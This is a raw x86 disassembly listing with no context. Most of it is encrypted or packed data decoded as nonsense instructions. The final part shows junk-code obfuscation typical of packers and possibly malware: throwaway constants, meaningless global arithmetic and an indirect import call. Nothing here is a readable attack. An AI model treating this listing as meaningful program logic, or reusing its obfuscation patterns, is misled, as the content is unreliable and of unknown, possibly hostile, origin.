  402046:	mov    al,0x72
  402048:	jmp    0x402074
  40204a:	sub    ah,ah
  40204c:	mul    esp
  40204e:	test   DWORD PTR [edi+ecx*2-0x5567483b],0xc4e53393
  402059:	stc    
  40205a:	jmp    0xb316ec6f
  40205f:	dec    ah
  402061:	(bad)  
  402062:	(bad)  
  402063:	push   eax
  402064:	fsubp  st(3),st
  402066:	daa    
  402067:	push   es
  402068:	dec    ebx
  402069:	push   ebp
  40206a:	stos   DWORD PTR es:[edi],eax
  40206b:	adc    BYTE PTR [ebp-0x64b4a994],ah
  402071:	sbb    eax,0x2453ec1a
  402076:	add    ch,BYTE PTR [ebx+0x7c]
  402079:	mov    bh,0xb7
  40207b:	mov    esp,eax
  40207d:	push   esi
  40207e:	sbb    al,0x4d
  402080:	iret   
  402081:	data16 mov ds:0x4a1f121a,al
  402087:	clc    
  402088:	sbb    BYTE PTR [ebp+0x7f],dh
  40208b:	and    ebp,DWORD PTR [esi]
  40208d:	mov    ebp,0xe087202d
  402092:	inc    ebp
  402093:	je     0x4020bf
  402095:	push   ebp
  402096:	in     al,0xad
  402098:	jbe    0x4020ef
  40209a:	out    dx,eax
  40209b:	push   ebx
  40209c:	das    
  40209d:	pop    ss
  40209e:	scas   eax,DWORD PTR es:[edi]
  40209f:	sti    
  4020a0:	call   0xa902:0x622f46a4
  4020a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020a8:	(bad)  
  4020a9:	int    0xa1
  4020ab:	mov    dh,0x5b
  4020ad:	mov    ch,0x64
  4020af:	jns    0x402071
  4020b1:	cmp    ah,BYTE PTR [ebp+0x7d98fea6]
  4020b7:	pop    ebx
  4020b8:	push   ds
  4020b9:	cmp    eax,0xe6d9b3eb
  4020be:	(bad)  
  4020bf:	adc    eax,0x101dba4a
  4020c4:	hlt    
  4020c5:	sub    BYTE PTR [esi-0x54],bl
  4020c8:	mov    esp,0xd5b2cccb
  4020cd:	fwait
  4020ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020cf:	mov    bh,0xbd
  4020d1:	test   DWORD PTR [edx-0x5e213ba7],0x85f7120
  4020db:	call   0xb6e1:0xe4284b97
  4020e2:	popa   
  4020e3:	xlat   BYTE PTR ds:[ebx]
  4020e4:	mov    ?,WORD PTR [bx+si-0xd]
  4020e8:	sti    
  4020e9:	test   eax,0xda171bbe
  4020ee:	(bad)
  4020f2:	cmp    al,0xe7
  4020f4:	jo     0x4020ec
  4020f6:	add    eax,0xed2cfd89
  4020fb:	aad    0x5f
  4020fd:	std    
  4020fe:	xchg   BYTE PTR cs:[edi],cl
  402101:	mov    al,ds:0x94ade7fd
  402106:	loope  0x402109
  402108:	adc    al,0x99
  40210a:	mov    ah,0x1d
  40210c:	pushf  
  40210d:	push   ss
  40210e:	retf   0xe96c
  402111:	xchg   edx,eax
  402112:	and    eax,0x81ec3279
  402117:	dec    ebx
  402118:	outs   dx,DWORD PTR ds:[esi]
  402119:	test   DWORD PTR [edx+0x36],ecx
  40211c:	(bad)  
  40211e:	stc    
  40211f:	push   0x3f
  402121:	mov    dh,0xc5
  402123:	ret    0xb6a9
  402126:	xchg   DWORD PTR [esi],esi
  402128:	cdq    
  402129:	test   eax,0x8be90dfb
  40212e:	push   0xfffffffc
  402130:	cmp    ch,al
  402132:	inc    ebp
  402133:	push   edi
  402134:	int    0x64
  402136:	aaa    
  402137:	fsub   QWORD PTR [ecx+0x70fa7fa8]
  40213d:	or     DWORD PTR [esi+edi*8+0x6],esp
  402141:	shl    DWORD PTR fs:[eax],0xc3
  402145:	inc    ebp
  402146:	ficomp WORD PTR [esi+0x65]
  402149:	add    DWORD PTR [ebx+edx*8],ebx
  40214c:	push   ecx
  40214d:	or     ah,al
  40214f:	fidiv  WORD PTR [edi+0x2a7a733b]
  402155:	sbb    edx,DWORD PTR [edx-0x39]
  402158:	aam    0xe
  40215a:	test   eax,0x417541c
  40215f:	push   ebx
  402160:	inc    esp
  402161:	xchg   ebp,eax
  402162:	aam    0x92
  402164:	mov    eax,0x8ac181d4
  402169:	mov    ecx,0x3f0070e2
  40216e:	dec    eax
  40216f:	lods   eax,DWORD PTR ds:[esi]
  402170:	popf   
  402171:	and    BYTE PTR [edi],dl
  402173:	es mov eax,0x9a7a184b
  402179:	icebp  
  40217a:	es jmp 0x74ad:0x157db02f
  402182:	repz (bad) 
  402184:	clc    
  402185:	ins    BYTE PTR es:[edi],dx
  402186:	inc    edi
  402187:	push   0xbd3d477c
  40218c:	fdivr  st(6),st
  40218e:	sahf   
  40218f:	sbb    eax,0x20579b8
  402194:	call   0x752e:0xe291b9ca
  40219b:	and    BYTE PTR [edx],0x8f
  40219e:	popa   
  40219f:	outs   dx,DWORD PTR ds:[esi]
  4021a0:	lods   al,BYTE PTR ds:[esi]
  4021a1:	jp     0x40215d
  4021a3:	dec    edx
  4021a4:	jnp    0x4021ec
  4021a6:	inc    eax
  4021a7:	out    dx,eax
  4021a8:	aam    0x6d
  4021aa:	push   es
  4021ab:	iret   
  4021ac:	lods   al,BYTE PTR ds:[esi]
  4021ad:	std    
  4021ae:	arpl   WORD PTR [edx+0x51b7c2fa],ax
  4021b4:	xchg   esi,eax
  4021b5:	cmp    al,0x33
  4021b7:	arpl   WORD PTR [ebx+0x5f2dd6bf],ax
  4021bd:	div    esp
  4021bf:	push   ss
  4021c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021c1:	ret    
  4021c2:	cmp    DWORD PTR [esi],ebx
  4021c4:	sub    DWORD PTR [eax+0x57],ecx
  4021c7:	mov    dl,0x2
  4021ca:	scas   eax,DWORD PTR es:[edi]
  4021cb:	(bad)  
  4021cd:	lods   eax,DWORD PTR ds:[esi]
  4021ce:	or     DWORD PTR [edx-0x2a45e0d2],esi
  4021d4:	xchg   DWORD PTR [edx+0x246bdaf4],ebp
  4021da:	test   al,0x73
  4021dc:	mov    BYTE PTR [edi],cl
  4021de:	inc    ecx
  4021df:	out    0xe,al
  4021e1:	or     DWORD PTR [ebx],edi
  4021e3:	fnstenv [eax]
  4021e5:	aaa    
  4021e6:	pop    esp
  4021e7:	sbb    esi,ebp
  4021e9:	xchg   edx,eax
  4021ea:	fstp   TBYTE PTR [ecx-0x4d]
  4021ed:	lods   al,BYTE PTR ds:[esi]
  4021ee:	scas   eax,DWORD PTR es:[edi]
  4021ef:	add    esi,DWORD PTR [ebp-0x2e]
  4021f2:	sbb    BYTE PTR [esp+ecx*8],cl
  4021f5:	in     eax,0x82
  4021f7:	add    BYTE PTR [eax-0x41],dh
  4021fa:	repz pop ecx
  4021fc:	fist   WORD PTR [ebp+0x20]
  4021ff:	je     0x40219d
  402201:	jl     0x402265
  402203:	ret    0x42d3
  402206:	cmc    
  402207:	pop    eax
  402208:	mov    dl,0xfd
  40220a:	add    edi,DWORD PTR [ebx-0x486280d1]
  402210:	jo     0x402266
  402212:	das    
  402213:	cwde   
  402214:	into   
  402215:	fistp  QWORD PTR [edi+ebx*8-0x739a6830]
  40221c:	or     eax,0x1367b0ba
  402221:	xchg   ebx,eax
  402222:	icebp  
  402223:	sahf   
  402224:	out    dx,eax
  402225:	dec    eax
  402226:	inc    eax
  402227:	mov    edx,0xf7afb295
  40222c:	stos   BYTE PTR es:[edi],al
  40222d:	add    DWORD PTR [edi+0x51],edx
  402230:	lahf   
  402231:	xchg   ebp,eax
  402232:	or     ebp,ebp
  402234:	out    0x3a,eax
  402236:	test   al,0xca
  402238:	push   ecx
  402239:	clc    
  40223a:	jmp    0x3ef9c265
  40223f:	xchg   edx,eax
  402240:	adc    al,0x15
  402242:	mov    edx,0xcca33861
  402247:	daa    
  402248:	jae    0x402248
  40224a:	jbe    0x4021f9
  40224c:	xor    eax,0x9445c71b
  402251:	mov    BYTE PTR [ecx],al
  402253:	add    BYTE PTR [eax],al
  402255:	mov    DWORD PTR [ebp-0x70],0x5b3f
  40225c:	and    DWORD PTR ds:0x4228be,ecx
  402262:	jmp    0x4027ec
  402267:	loope  0x402242
  402269:	mov    bh,0x25
  40226b:	scas   eax,DWORD PTR es:[edi]
  40226c:	sbb    DWORD PTR [ecx+0x19],ebx
  40226f:	dec    edx
  402270:	retf   0x7262
  402273:	adc    DWORD PTR [eax+0x24],eax
  402276:	push   0x1616f6a1
  40227b:	cmp    eax,0xeb161604
  402280:	mov    bh,0xad
  402282:	push   ds
  402283:	jmp    0xa5635447
  402288:	sub    dh,BYTE PTR [edi]
  40228a:	add    eax,0x12554838
  40228f:	ja     0x4022e7
  402291:	sbb    eax,0x780f7132
  402296:	int3   
  402297:	sbb    bl,BYTE PTR [esi-0x69]
  40229a:	jb     0x4022f5
  40229c:	mov    bh,0x7b
  40229e:	push   ebx
  40229f:	sbb    al,BYTE PTR [ecx-0x7d]
  4022a2:	js     0x4022d7
  4022a4:	mov    al,ds:0xa93b2e7b
  4022a9:	lahf   
  4022aa:	stos   DWORD PTR es:[edi],eax
  4022ab:	lods   al,BYTE PTR ds:[esi]
  4022ac:	ret    0x4bd6
  4022af:	jb     0x40228e
  4022b1:	cmp    eax,0xa6c470b7
  4022b6:	mov    eax,0x6b9274b6
  4022bb:	mov    BYTE PTR ss:[eax-0x39],dh
  4022bf:	rcl    ecx,1
  4022c1:	and    al,0xc6
  4022c3:	repz popf 
  4022c5:	in     al,0x9c
  4022c7:	test   BYTE PTR [ebp+eiz*4+0x16bc4f66],al
  4022ce:	and    eax,0xaae22173
  4022d3:	mov    esp,0x2de26087
  4022d8:	jmp    0x4022d2
  4022da:	push   esi
  4022db:	add    ah,BYTE PTR [edx-0x48]
  4022de:	call   0x3102:0x65771528
  4022e5:	call   0xb20a:0xf8d4c738
  4022ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022ed:	(bad)  
  4022ee:	shl    BYTE PTR [edi-0x35e869a0],0xb1
  4022f5:	(bad)  
  4022f6:	fbstp  TBYTE PTR [ebx+edx*4-0x73]
  4022fa:	jno    0x4022c1
  4022fc:	test   eax,0xe68c7a7a
  402301:	mov    ah,0x3b
  402303:	ss std 
  402305:	sub    al,0x3e
  402307:	jmp    0x40228d
  402309:	or     cl,BYTE PTR [eax+0xe]
  40230c:	(bad)
  40230f:	(bad)  
  402311:	out    dx,al
  402312:	xchg   esi,eax
  402313:	jno    0x40229d
  402315:	popf   
  402316:	add    esp,eax
  402318:	aas    
  402319:	xor    eax,DWORD PTR [edi-0x2c0c5a11]
  40231f:	xchg   esp,eax
  402320:	into   
  402321:	inc    ebp
  402322:	mov    ah,0x9e
  402324:	iret   
  402325:	stc    
  402326:	fmul   DWORD PTR [ebp-0x6e]
  402329:	and    DWORD PTR [edx],ebx
  40232b:	loop   0x40233f
  40232d:	aad    0x8d
  40232f:	dec    edi
  402330:	sub    BYTE PTR [ebx],dl
  402332:	mov    eax,ds:0x748d4b3a
  402337:	cld    
  402338:	not    ecx
  40233a:	sub    al,0xc2
  40233c:	das    
  40233d:	gs jae 0x402343
  402340:	cmp    al,al
  402342:	and    cl,ch
  402344:	fistp  DWORD PTR [edi+0x3a]
  402347:	outs   dx,DWORD PTR ds:[esi]
  402348:	mov    ch,0xb
  40234a:	xlat   BYTE PTR ds:[ebx]
  40234b:	mov    WORD PTR [eax],ss
  40234d:	sub    eax,DWORD PTR [eax+ecx*8]
  402350:	cmp    DWORD PTR [ebx+0x7],esp
  402353:	jge    0x402368
  402355:	mov    dh,0xb6
  402357:	das    
  402358:	(bad)  
  402359:	and    eax,0xd09a54d8
  40235e:	pop    ecx
  40235f:	jne    0x402374
  402361:	int3   
  402362:	mov    ch,dl
  402364:	ror    DWORD PTR [eax],1
  402366:	sub    esp,DWORD PTR [edi+0x16]
  402369:	call   0xce1a:0x9ac8cbb7
  402370:	mov    ds:0x3db130a6,eax
  402375:	mov    dl,0xc0
  402377:	aas    
  402378:	(bad)  
  402379:	dec    eax
  40237a:	ds scas al,BYTE PTR es:[edi]
  40237c:	mov    esp,0xbcbdb004
  402381:	add    al,0xdc
  402383:	cdq    
  402384:	call   0x81fac7b9
  402389:	fist   DWORD PTR [edi]
  40238b:	(bad)  [ebx+eiz*2]
  40238e:	mov    al,0xfc
  402390:	retf   
  402391:	sahf   
  402392:	sub    al,0x46
  402394:	xchg   esi,eax
  402395:	cmp    ch,BYTE PTR [ecx-0x3da7ca1f]
  40239b:	jmp    0x385e:0xb487244f
  4023a2:	cmp    al,0x4a
  4023a4:	shr    DWORD PTR ds:0x19170fce,cl
  4023aa:	hlt    
  4023ab:	cwde   
  4023ac:	and    edi,ebp
  4023ae:	mov    edi,DWORD PTR [esi-0x5a12eb91]
  4023b4:	pushf  
  4023b5:	rcr    BYTE PTR [ecx],0xd1
  4023b8:	repnz sbb eax,0x299b2eeb
  4023be:	dec    esp
  4023bf:	jmp    0x4023a0
  4023c1:	mov    ch,0x6e
  4023c3:	add    DWORD PTR [ecx+0x68871c20],edi
  4023c9:	sbb    al,0x43
  4023cb:	mov    ds:0xacf31af9,al
  4023d0:	mov    edi,edi
  4023d2:	xchg   ebp,eax
  4023d3:	icebp  
  4023d4:	dec    ebx
  4023d5:	jg     0x4023b0
  4023d7:	push   ss
  4023d8:	rcl    DWORD PTR [edx+0x340fd6c3],1
  4023de:	ins    DWORD PTR es:[edi],dx
  4023df:	sbb    esp,esi
  4023e1:	loop   0x4023df
  4023e3:	or     eax,0x4d85da5f
  4023e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023e9:	lea    esp,[ebp-0x6]
  4023ec:	stos   BYTE PTR es:[edi],al
  4023ed:	push   ds
  4023ee:	cdq    
  4023ef:	push   edx
  4023f0:	add    DWORD PTR [edx+0x56],edi
  4023f3:	rcr    BYTE PTR [ebp-0x31e00135],0x76
  4023fa:	xchg   ebp,eax
  4023fb:	push   esp
  4023fc:	sbb    eax,0x53b73f29
  402401:	out    dx,al
  402402:	push   ecx
  402403:	pop    ds
  402404:	lods   al,BYTE PTR ds:[esi]
  402405:	in     al,dx
  402406:	pusha  
  402407:	cmp    ah,BYTE PTR [ecx-0xf]
  40240a:	cmp    DWORD PTR [eax+ebp*1-0x55],ebp
  40240e:	mov    eax,ds:0x9311bb75
  402413:	pop    esp
  402414:	test   al,0x64
  402416:	cmp    al,0x1d
  402418:	(bad)  [eax-0xe]
  40241b:	loopne 0x40248b
  40241d:	in     eax,0xc3
  40241f:	js     0x40245f
  402421:	inc    BYTE PTR [ebp+0x39]
  402424:	arpl   WORD PTR [edi],dx
  402426:	scas   eax,DWORD PTR es:[edi]
  402427:	xchg   ecx,eax
  402428:	sub    ah,dl
  40242a:	mov    bh,0xd
  40242c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40242d:	sahf   
  40242e:	add    bl,0x69
  402431:	push   0xffffffe7
  402433:	popa   
  402434:	imul   esp,DWORD PTR [ebx-0x67],0xffffff94
  402438:	jae    0x402468
  40243a:	mov    DWORD PTR [ebx+0x63],edx
  40243d:	out    dx,eax
  40243e:	and    al,0x86
  402440:	jno    0x40246c
  402442:	dec    edi
  402443:	xor    dh,BYTE PTR [ecx-0x396bc8e0]
  402449:	xor    al,0x18
  40244b:	mov    BYTE PTR [eax-0x33],cl
  40244e:	dec    ebp
  40244f:	inc    ebp
  402450:	inc    edx
  402451:	jnp    0x4023dc
  402453:	inc    ebp
  402454:	jae    0x402495
  402456:	pop    ss
  402457:	lods   al,BYTE PTR ds:[esi]
  402458:	mov    bl,0xaa
  40245a:	xchg   ebx,eax
  40245b:	jnp    0x40242b
  40245d:	cmp    dl,BYTE PTR [ebx+edi*8+0x5225a6dd]
  402464:	push   ebx
  402465:	adc    ebp,ebx
  402467:	jge    0x402443
  402469:	(bad)  
  40246a:	aas    
  40246b:	into   
  40246c:	cld    
  40246d:	int3   
  40246e:	jmp    0x4023f7
  402470:	shl    BYTE PTR [ecx],1
  402472:	inc    edx
  402473:	mov    al,ds:0x64047517
  402478:	sbb    BYTE PTR [ecx],bl
  40247a:	jmp    0xb04f:0x6707b261
  402481:	aas    
  402482:	cmc    
  402483:	lahf   
  402484:	ffree  st(0)
  402486:	mov    al,ds:0x4be8e12c
  40248b:	xor    ch,BYTE PTR [ebp-0x1f]
  40248e:	sbb    esp,ebx
  402490:	xchg   ecx,eax
  402491:	add    esi,DWORD PTR ds:0x3d40320e
  402497:	clc    
  402498:	fisubr WORD PTR [eax]
  40249a:	(bad)  
  40249b:	mov    dh,0x5b
  40249d:	in     al,0x1f
  40249f:	sbb    ebx,DWORD PTR [ebp+0x3074a5cd]
  4024a5:	sub    edi,ebp
  4024a7:	lea    eax,ds:0x5fc97f35
  4024ad:	pop    ss
  4024ae:	inc    esp
  4024af:	jecxz  0x40249a
  4024b1:	inc    esi
  4024b2:	jmp    0x4f24f2c6
  4024b7:	test   dl,cl
  4024b9:	xchg   BYTE PTR [eax-0x6c0bc232],cl
  4024bf:	ror    BYTE PTR es:[eax],cl
  4024c2:	fimul  WORD PTR [edx]
  4024c4:	hlt    
  4024c5:	imul   edx,DWORD PTR [edi+edx*2-0x4c75b8a4],0x956225f8
  4024d0:	js     0x4024ac
  4024d2:	lahf   
  4024d3:	jmp    0x7c8d311a
  4024d8:	cmp    esp,DWORD PTR [edx-0x2f38f44e]
  4024de:	and    DWORD PTR [edx+ebp*1-0x37],edx
  4024e2:	pop    edi
  4024e3:	dec    edx
  4024e4:	dec    ecx
  4024e5:	add    DWORD PTR [edi],ebp
  4024e7:	push   ecx
  4024e8:	fidivr DWORD PTR [edx]
  4024ea:	sbb    al,0xbb
  4024ec:	mov    al,0x8d
  4024ee:	push   cs
  4024ef:	retf   
  4024f0:	xlat   BYTE PTR ds:[ebx]
  4024f2:	lods   eax,DWORD PTR ds:[esi]
  4024f3:	and    esi,ebx
  4024f5:	jno    0x40252c
  4024f7:	fisubr DWORD PTR [ecx]
  4024f9:	sub    dl,al
  4024fb:	mov    ch,0x84
  4024fd:	aam    0x4d
  4024ff:	lods   al,BYTE PTR ds:[esi]
  402500:	xchg   bh,al
  402502:	mov    ds:0x7a1eedb5,al
  402507:	sbb    eax,0xf7ed1ede
  40250c:	xor    eax,0x41daed0c
  402511:	and    eax,DWORD PTR [ecx]
  402513:	ss jmp 0xe06db0d
  402519:	pop    esp
  40251a:	imul   ebx,DWORD PTR [ecx-0x2a215651],0xffffffeb
  402521:	dec    ecx
  402522:	sub    al,0xe4
  402524:	jg     0x4024d0
  402526:	or     edx,DWORD PTR [ebx]
  402528:	mov    ds:0xc4b6b4d4,eax
  40252d:	adc    eax,0x1874c0a6
  402532:	pop    ecx
  402533:	and    DWORD PTR [ebx],0x2ff1a406
  402539:	lahf   
  40253a:	in     eax,0xba
  40253c:	pop    edx
  40253d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40253e:	scas   al,BYTE PTR es:[edi]
  40253f:	sar    ebp,0x45
  402542:	sbb    bh,bh
  402544:	mov    ebx,0x1359e06
  402549:	adc    eax,0x3cabe5c3
  40254e:	jge    0x402531
  402550:	lock cmp ecx,DWORD PTR ss:[esi-0x7972a950]
  402558:	mov    edi,0x55e52f49
  40255d:	xchg   esi,eax
  40255e:	aam    0x98
  402560:	adc    eax,0x93b032af
  402565:	pop    eax
  402566:	inc    ebx
  402567:	jo     0x402509
  402569:	push   edi
  40256a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40256b:	cli    
  40256c:	enter  0xe325,0x12
  402570:	cld    
  402571:	mov    bh,0x72
  402573:	dec    edx
  402574:	pop    ebx
  402575:	cmp    DWORD PTR [ebx+0x3653885e],edi
  40257b:	push   es
  40257c:	and    al,BYTE PTR [edx+0x2800d0cf]
  402582:	or     DWORD PTR [edi],0x9
  402585:	cdq    
  402586:	ins    DWORD PTR es:[edi],dx
  402587:	loopne 0x402600
  402589:	and    DWORD PTR ds:0xf449fc77,ecx
  40258f:	pop    ebx
  402590:	xor    BYTE PTR [ecx-0xb399e92],al
  402596:	ror    BYTE PTR [edx+0x2c],0xca
  40259a:	mov    ds:0x6c19beeb,eax
  40259f:	sub    al,0xbc
  4025a1:	lahf   
  4025a2:	jp     0x40254d
  4025a4:	xchg   ecx,eax
  4025a5:	cmp    al,BYTE PTR [ebx-0x3a]
  4025a8:	and    DWORD PTR [esi+edi*4-0x59],ecx
  4025ac:	mov    ah,0x5a
  4025ae:	call   0x9f24:0xdf932414
  4025b5:	mov    ebx,0x5673ec4f
  4025ba:	and    ebx,DWORD PTR [eax+0xd03ef7b]
  4025c0:	mov    ecx,0x5664ac1d
  4025c5:	sti    
  4025c6:	stos   DWORD PTR es:[edi],eax
  4025c7:	pop    esi
  4025c8:	lea    eax,[edx]
  4025ca:	vpor   xmm1,xmm3,XMMWORD PTR [edx]
  4025ce:	rcl    esi,1
  4025d0:	out    dx,al
  4025d1:	sbb    al,0x7d
  4025d3:	pop    ss
  4025d4:	(bad)  
  4025d5:	jmp    0xa83c1406
  4025da:	int    0x38
  4025dc:	imul   esp,DWORD PTR [edi],0x4231805d
  4025e2:	jb     0x402585
  4025e4:	out    0xb7,eax
  4025e6:	adc    al,0x62
  4025e8:	and    eax,0x74e94b18
  4025ed:	mov    dl,0x55
  4025ef:	jmp    0x402666
  4025f1:	jo     0x4025d8
  4025f3:	pop    esi
  4025f4:	mov    ebp,0x2dfd5881
  4025f9:	repz out dx,eax
  4025fb:	in     eax,0x15
  4025fd:	(bad)  
  4025fe:	jmp    0x9d52:0xa297713e
  402605:	adc    al,0x29
  402607:	jne    0x40260f
  402609:	test   al,0xe6
  40260b:	rcr    BYTE PTR [edx-0x668a7eb8],0xf4
  402612:	mov    ds:0x43e0123e,al
  402617:	cmp    bh,cl
  402619:	sub    al,0x79
  40261b:	push   eax
  40261c:	aad    0x24
  40261e:	jp     0x40262d
  402620:	int3   
  402621:	test   al,0x61
  402623:	(bad)  
  402624:	aaa    
  402625:	xchg   DWORD PTR [ebx+edx*8],ebp
  402628:	push   es
  402629:	popa   
  40262a:	repnz sbb DWORD PTR [ebx+0xa54e61b],esp
  402631:	xchg   edi,eax
  402632:	push   ebx
  402633:	les    esp,FWORD PTR cs:[edx+eiz*1-0x610b9eef]
  40263b:	(bad)  [ecx+ebp*1+0x5f3259ed]
  402642:	in     al,0xe9
  402644:	cli    
  402645:	addr16 into 
  402647:	dec    ecx
  402648:	loop   0x402660
  40264a:	call   0x8077:0x89b6a19
  402651:	out    0xe5,al
  402653:	cli    
  402654:	sahf   
  402655:	std    
  402656:	xor    DWORD PTR [ecx-0x517afcd],esi
  40265c:	lea    esp,[ebx+0x14]
  40265f:	mov    ds:0x797371bd,al
  402664:	test   DWORD PTR [ecx-0x1ec540d2],esp
  40266a:	jl     0x40264e
  40266c:	fprem1 
  40266e:	fs pop esp
  402670:	std    
  402671:	sub    BYTE PTR [edx+esi*1],bl
  402674:	add    ch,dl
  402676:	jp     0xf5757db6
  40267c:	mov    edx,esi
  40267e:	or     BYTE PTR [esi-0x42],0xda
  402682:	adc    DWORD PTR [edi],0xffffffae
  402685:	push   edx
  402686:	adc    eax,0x4be3186b
  40268b:	ss pop ebx
  40268d:	loop   0x402659
  40268f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402690:	imul   ecx,DWORD PTR [eax],0x657908cb
  402696:	xchg   edi,eax
  402697:	jb     0x4026bb
  402699:	scas   eax,DWORD PTR es:[edi]
  40269a:	popa   
  40269b:	jmp    0x402634
  40269d:	adc    cl,al
  40269f:	aad    0x26
  4026a1:	retf   
  4026a2:	dec    eax
  4026a3:	fdivr  QWORD PTR [ebx+0x2ed3fa0f]
  4026a9:	sbb    BYTE PTR [ebx-0x28398a6b],al
  4026af:	xor    al,0x73
  4026b1:	sbb    cl,BYTE PTR [ebp+0x59c2dfdd]
  4026b7:	retf   
  4026b8:	fbstp  TBYTE PTR [esi-0x3]
  4026bb:	push   ebp
  4026bc:	outs   dx,DWORD PTR ds:[esi]
  4026bd:	add    DWORD PTR [ecx+0x7d13ed53],eax
  4026c3:	dec    ebx
  4026c4:	mov    WORD PTR [ebp+0x2a],ss
  4026c7:	imul   esi,DWORD PTR [ebp+esi*4+0x52],0x914e9f81
  4026cf:	gs sub eax,0xce6c0abe
  4026d5:	dec    ebx
  4026d6:	scas   al,BYTE PTR es:[edi]
  4026d7:	fnstsw WORD PTR [eax-0x79]
  4026da:	mov    eax,ds:0xafda086b
  4026df:	aad    0x2e
  4026e1:	std    
  4026e2:	ins    BYTE PTR es:[edi],dx
  4026e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026e4:	xchg   edx,eax
  4026e5:	xchg   ebx,eax
  4026e6:	xchg   ebx,eax
  4026e7:	mov    edi,0xb8253edf
  4026ec:	mov    al,ds:0xce3dde77
  4026f1:	jne    0x4026c4
  4026f3:	repz dec ebp
  4026f5:	aaa    
  4026f6:	or     cl,bl
  4026f8:	dec    ebp
  4026f9:	fisttp QWORD PTR [ebx]
  4026fb:	fimul  DWORD PTR [ebp-0x1dbd6ad2]
  402701:	and    eax,0xfc0f4714
  402706:	cmp    DWORD PTR [edx-0xa],ecx
  402709:	push   edx
  40270a:	add    eax,0x24969828
  40270f:	lods   eax,DWORD PTR ds:[esi]
  402710:	jmp    0x9a8efe88
  402715:	push   edi
  402716:	inc    edi
  402717:	xchg   ecx,eax
  402718:	bound  ecx,QWORD PTR ds:0x40e5631
  40271e:	mov    bh,0x6f
  402720:	sbb    bl,BYTE PTR [edx]
  402722:	pop    esp
  402723:	bound  eax,QWORD PTR [ecx+0x1b]
  402726:	adc    bl,BYTE PTR [ebx+esi*2-0xa]
  40272a:	mov    cl,0x7c
  40272c:	sbb    eax,DWORD PTR [eax-0x3a]
  40272f:	retf   0xd267
  402732:	adc    BYTE PTR [eax],bh
  402734:	in     eax,dx
  402735:	cmp    ch,bl
  402737:	jp     0x40273d
  402739:	pop    es
  40273a:	lock ror DWORD PTR [esi],1
  40273d:	retf   0x88f8
  402740:	fld    QWORD PTR [edx-0x5b]
  402743:	pop    edi
  402744:	cmp    BYTE PTR [esi],0x78
  402747:	cmp    BYTE PTR [edi-0x61],al
  40274a:	mov    WORD PTR [ebp+0x22],cs
  40274d:	mov    ebx,0x8b266487
  402752:	test   al,0xaa
  402754:	adc    bh,BYTE PTR ds:0xb7a4da2e
  40275a:	fild   QWORD PTR [ecx]
  40275c:	es sub esi,ebp
  40275f:	(bad)  
  402760:	sub    BYTE PTR [esi+0x7015356d],bl
  402766:	inc    ebx
  402767:	test   edx,ecx
  402769:	push   ebx
  40276a:	jne    0x40278a
  40276c:	sbb    ecx,esi
  40276e:	xor    edi,0xe3db8bd4
  402774:	aaa    
  402775:	xor    al,0xdd
  402777:	mov    edi,0x2ebac683
  40277c:	dec    esp
  40277d:	or     DWORD PTR [edi+0x6bf84cef],0x3d
  402784:	out    0x35,al
  402786:	xor    ch,bh
  402788:	bnd ja 0x402773
  40278b:	mul    BYTE PTR [eax+0x54cc0639]
  402791:	(bad)  
  402792:	sbb    ebx,DWORD PTR [edx+0x716a7bcb]
  402798:	mov    edi,0x80c9ca01
  40279d:	mov    esp,esi
  40279f:	pop    ss
  4027a0:	push   ds
  4027a1:	in     al,0x68
  4027a3:	sbb    edi,eax
  4027a5:	mov    al,ds:0x644b7cb8
  4027aa:	stc    
  4027ab:	push   ebx
  4027ac:	xchg   esp,eax
  4027ad:	mov    ds:0xad2b4d11,eax
  4027b2:	xor    eax,0xfd76f9ed
  4027b7:	std    
  4027b8:	sbb    bh,BYTE PTR [esi-0x3f]
  4027bb:	add    ecx,DWORD PTR [edi+0x9a65f7e]
  4027c1:	xchg   ebp,eax
  4027c2:	jno    0x402822
  4027c4:	repz and DWORD PTR [ebx+0x8f6654c],0xffffff90
  4027cc:	inc    ebp
  4027cd:	loopne 0x40284b
  4027cf:	or     al,0x71
  4027d1:	nop
  4027d2:	retf   
  4027d3:	dec    esp
  4027d4:	cmp    BYTE PTR [esi+edx*2],bl
  4027d7:	mov    edi,0x30140d99
  4027dc:	sub    eax,DWORD PTR [esi]
  4027de:	inc    edx
  4027df:	lds    ecx,FWORD PTR [ebp+0x18dfb4f5]
  4027e5:	inc    edi
  4027e6:	xchg   DWORD PTR [ebx+0xea3d6a9],ecx
  4027ec:	mov    DWORD PTR [ebp-0x6c],0x3219
  4027f3:	mov    DWORD PTR [ebp-0x70],0x231c
  4027fa:	cmp    DWORD PTR ds:0x4229aa,0x0
  402801:	mov    DWORD PTR ds:0x422962,0x2a7e
  40280b:	mov    DWORD PTR ds:0x42293e,0x75fd
  402815:	jmp    0x40286f
  40281a:	not    DWORD PTR ds:0x4228a2
  402820:	jg     0x40285d
  402826:	push   0x445a
  40282b:	push   DWORD PTR [ebp-0x24]
  40282e:	push   0x4228fe
  402833:	push   0x30cc
  402838:	push   0x5f1f
  40283d:	call   DWORD PTR ds:0x42a288
  402843:	xor    DWORD PTR ds:0x4228da,0x678e
  40284d:	adc    DWORD PTR ds:0x4228a2,0x5868
  402857:	xor    DWORD PTR ds:0x42296e,ecx
  40285d:	or     DWORD PTR ds:0x4228ba,edi
  402863:	or     DWORD PTR ds:0x42299e,ecx
  402869:	sbb    DWORD PTR ds:0x422966,ecx
  40286f:	mov    DWORD PTR [ebp-0x6c],0x1337
  402876:	mov    eax,ds:0x42294a
  40287b:	add    eax,DWORD PTR ds:0x42291e
  402881:	mov    ds:0x42294a,eax
  402886:	mov    DWORD PTR [ebp-0x70],0x7593
  40288d:	sbb    DWORD PTR ds:0x422906,edx
  402893:	mov    DWORD PTR [ebp-0x6c],0x11b8
  40289a:	mov    DWORD PTR [ebp-0x70],0x3b72
  4028a1:	mov    DWORD PTR [ebp-0x6c],0x3abc
  4028a8:	jmp    0x402e32
